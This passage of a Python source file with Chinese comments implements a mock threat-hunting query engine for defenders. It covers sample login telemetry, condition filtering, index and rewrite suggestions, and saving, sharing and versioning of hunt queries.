                "signature_status": sig, "hostname": host, "timestamp": ts,
            })

        # 生成模拟登录数据
        suspicious_logins = [
            ("jsmith", "rdp", "failure", "45.132.9.87", "WIN-PC-01", "2026-09-14 07:50:00"),
            ("jsmith", "rdp", "failure", "45.132.9.87", "WIN-PC-01", "2026-09-14 07:51:00"),
            ("jsmith", "rdp", "failure", "45.132.9.87", "WIN-PC-01", "2026-09-14 07:52:00"),
            ("jsmith", "rdp", "failure", "45.132.9.87", "WIN-PC-01", "2026-09-14 07:53:00"),
            ("jsmith", "rdp", "success", "45.132.9.87", "WIN-PC-01", "2026-09-14 07:55:00"),
            ("admin", "ssh", "success", "185.220.101.45", "DB01", "2026-09-14 02:30:00"),
            ("ajones", "rdp", "success", "192.168.1.100", "WIN-PC-02", "2026-09-14 03:15:00"),
            ("bwong", "winrm", "success", "10.0.0.5", "WEB01", "2026-09-14 23:45:00"),
        ]
        for user, svc, result, src, host, ts in suspicious_logins:
            logins.append({
                "user_name": user, "service": svc, "result": result,
                "source_ip": src, "hostname": host, "timestamp": ts,
            })

        return {
            "process": processes, "network": networks, "file": files,
            "registry": [], "user": [], "login": logins,
        }

    def execute(self, parsed: Dict[str, Any]) -> Dict[str, Any]:
        """执行查询并返回结果。"""
        self.execution_count += 1
        entity = parsed.get("entity", "process")
        conditions = parsed.get("conditions", [])
        limit = parsed.get("limit", 100)
        offset = parsed.get("offset", 0)

        data = self._sample_data.get(entity, [])

        # 简单条件过滤
        filtered = []
        for row in data:
            match = True
            for cond in conditions:
                field = cond.get("field", "")
                op = cond.get("operator", "")
                expected = cond.get("value", "")
                actual = str(row.get(field, ""))
                if op in ("=",):
                    if actual != expected:
                        match = False
                        break
                elif op in ("MATCHES", "LIKE"):
                    try:
                        if not re.search(expected, actual, re.IGNORECASE):
                            match = False
                            break
                    except re.error:
                        match = False
                        break
                elif op in ("IN",):
                    items = [v.strip().strip("'").strip('"') for v in expected.strip("()").split(",")]
                    if actual not in items:
                        match = False
                        break
                elif op in ("!=",):
                    if actual == expected:
                        match = False
                        break
                elif op in (">", "<", ">=", "<="):
                    try:
                        av = float(actual)
                        ev = float(expected)
                        if op == ">" and not (av > ev):
                            match = False
                            break
                        elif op == "<" and not (av < ev):
                            match = False
                            break
                    except (ValueError, TypeError):
                        match = False
                        break
            if match:
                filtered.append(row)

        total = len(filtered)
        page = filtered[offset:offset + limit]

        return {
            "entity": entity,
            "total_matches": total,
            "returned": len(page),
            "offset": offset,
            "limit": limit,
            "page": page,
            "execution_time_ms": 15 + (hash(parsed.get("raw", "")) % 80),
            "scanned_records": len(data) * 1000,
        }


# --------------------------------------------------------------------------- #
# 查询性能优化器
# --------------------------------------------------------------------------- #
class QueryOptimizer:
    """查询性能优化建议器。"""

    def analyze(self, parsed: Dict[str, Any]) -> Dict[str, Any]:
        """分析查询并给出优化建议。"""
        suggestions = []
        estimated_cost = 1.0
        index_suggestions = []
        rewritten = parsed.get("raw", "")

        entity = parsed.get("entity", "")
        conditions = parsed.get("conditions", [])

        # 索引建议
        if entity == "process":
            index_suggestions.append("建议对 (hostname, timestamp) 建复合索引")
            index_suggestions.append("建议对 process_name 建倒排索引")
        elif entity == "network":
            index_suggestions.append("建议对 (destination_ip, timestamp) 建复合索引")
            index_suggestions.append("建议对 (source_ip, destination_port) 建索引")
        elif entity == "file":
            index_suggestions.append("建议对 (hostname, file_extension, event_type) 建索引")
        elif entity == "login":
            index_suggestions.append("建议对 (source_ip, result, timestamp) 建索引")

        # 查询重写建议
        if any(c.get("operator") in ("MATCHES", "LIKE") and "%" in str(c.get("value", "")) for c in conditions):
            suggestions.append("MATCHES/LIKE 使用前导通配符会导致全表扫描，建议避免以 % 开头的模式")
            estimated_cost *= 3.0

        if parsed.get("having"):
            suggestions.append("HAVING 子句建议先用 WHERE 预过滤再聚合")
            estimated_cost *= 1.5

        # 超时建议
        estimated_timeout = max(30, int(estimated_cost * 60))

        return {
            "estimated_cost": round(estimated_cost, 2),
            "estimated_timeout_seconds": estimated_timeout,
            "index_suggestions": index_suggestions,
            "query_rewrite_suggestions": suggestions,
            "rewritten_query": rewritten,
        }


# --------------------------------------------------------------------------- #
# 主引擎类
# --------------------------------------------------------------------------- #
class HuntQueryEngine:
    """狩猎查询引擎主类。"""

    def __init__(self) -> None:
        self.parser = QueryParser()
        self.executor = QueryExecutor()
        self.optimizer = QueryOptimizer()
        self._saved_queries: Dict[str, Dict[str, Any]] = {}
        self._query_history: List[Dict[str, Any]] = []
        self._query_versions: Dict[str, List[Dict[str, Any]]] = {}
        self._shared_queries: Dict[str, Dict[str, Any]] = {}
        self._init_templates()

    def _init_templates(self) -> None:
        """初始化模板库。"""
        self.templates = {t.template_id: t for t in HUNT_QUERY_TEMPLATES}

    # ---- 查询解析与验证 ----
    def validate_query(self, query: str) -> Dict[str, Any]:
        """验证查询语句语法。"""
        parsed = self.parser.parse(query)
        return {
            "valid": parsed["valid"],
            "errors": parsed["errors"],
            "warnings": parsed["warnings"],
            "parsed": parsed,
        }

    # ---- 查询执行 ----
    def execute_query(self, query: str, page: int = 1, page_size: int = 20) -> Dict[str, Any]:
        """执行狩猎查询，支持分页。"""
        parsed = self.parser.parse(query)
        if not parsed["valid"]:
            return {"success": False, "errors": parsed["errors"], "results": [], "total": 0}

        parsed["offset"] = (page - 1) * page_size
        parsed["limit"] = page_size

        result = self.executor.execute(parsed)
        optimization = self.optimizer.analyze(parsed)

        # 记录历史
        history_entry = {
            "query_id": uuid.uuid4().hex[:12],
            "query": query,
            "executed_at": time.strftime("%Y-%m-%d %H:%M:%S"),
            "execution_time_ms": result["execution_time_ms"],
            "matches": result["total_matches"],
            "entity": result["entity"],
        }
        self._query_history.insert(0, history_entry)
        self._query_history = self._query_history[:100]

        return {
            "success": True,
            "results": result["page"],
            "total": result["total_matches"],
            "page": page,
            "page_size": page_size,
            "entity": result["entity"],
            "execution_time_ms": result["execution_time_ms"],
            "scanned_records": result["scanned_records"],
            "optimization": optimization,
            "query_id": history_entry["query_id"],
        }

    # ---- 模板库管理 ----
    def list_templates(self, category: Optional[str] = None) -> List[Dict[str, Any]]:
        """列出查询模板。"""
        templates = list(self.templates.values())
        if category:
            templates = [t for t in templates if t.category == category]
        return [
            {
                "template_id": t.template_id,
                "name": t.name,
                "category": t.category,
                "mitre_technique": t.mitre_technique,
                "description": t.description,
                "query": t.query,
                "severity": t.severity,
                "tags": t.tags,
                "author": t.author,
            }
            for t in templates
        ]

    def get_template(self, template_id: str) -> Optional[Dict[str, Any]]:
        """获取单个模板。"""
        t = self.templates.get(template_id)
        if not t:
            return None
        return {
            "template_id": t.template_id, "name": t.name, "category": t.category,
            "mitre_technique": t.mitre_technique, "description": t.description,
            "query": t.query, "severity": t.severity, "tags": t.tags,
        }

    # ---- 查询保存/分享/版本管理 ----
    def save_query(self, name: str, query: str, description: str = "", tags: List[str] = None,
                   author: str = "analyst") -> Dict[str, Any]:
        """保存查询并创建版本。"""
        query_id = uuid.uuid4().hex[:12]
        version = 1
        if query_id not in self._query_versions:
            self._query_versions[query_id] = []

        entry = {
            "query_id": query_id, "name": name, "query": query,
            "description": description, "tags": tags or [],
            "author": author, "version": version,
            "saved_at": time.strftime("%Y-%m-%d %H:%M:%S"),
        }
        self._saved_queries[query_id] = entry
        self._query_versions[query_id].append(entry)
        return entry

    def update_query(self, query_id: str, query: str, description: str = "") -> Optional[Dict[str, Any]]:
        """更新查询，创建新版本。"""
        if query_id not in self._saved_queries:
            return None
        old = self._saved_queries[query_id]
        new_version = len(self._query_versions.get(query_id, [])) + 1
        entry = {
            "query_id": query_id, "name": old["name"], "query": query,
            "description": description or old["description"],
            "tags": old["tags"], "author": old["author"],
            "version": new_version,
            "saved_at": time.strftime("%Y-%m-%d %H:%M:%S"),
        }
        self._saved_queries[query_id] = entry
        self._query_versions.setdefault(query_id, []).append(entry)
        return entry

    def share_query(self, query_id: str) -> Optional[Dict[str, Any]]:
        """分享查询到共享库。"""
        if query_id not in self._saved_queries:
            return None
        entry = self._saved_queries[query_id].copy()
        share_id = uuid.uuid4().hex[:12]
        entry["share_id"] = share_id
        entry["shared_at"] = time.strftime("%Y-%m-%d %H:%M:%S")
        self._shared_queries[share_id] = entry
        return entry

    def list_saved_queries(self) -> List[Dict[str, Any]]:
        """列出已保存查询。"""
        return list(self._saved_queries.values())

    def list_shared_queries(self) -> List[Dict[str, Any]]:
        """列出共享查询。"""
        return list(self._shared_queries.values())

    def get_query_versions(self, query_id: str) -> List[Dict[str, Any]]:
        """获取查询版本历史。"""
        return self._query_versions.get(query_id, [])

    # ---- 查询历史 ----
    def get_history(self, limit: int = 20) -> List[Dict[str, Any]]:
        """获取查询历史。"""
        return self._query_history[:limit]

    # ---- 性能优化 ----
    def optimize_query(self, query: str) -> Dict[str, Any]:
        """分析查询性能并给出优化建议。"""
        parsed = self.parser.parse(query)
        return self.optimizer.analyze(parsed)
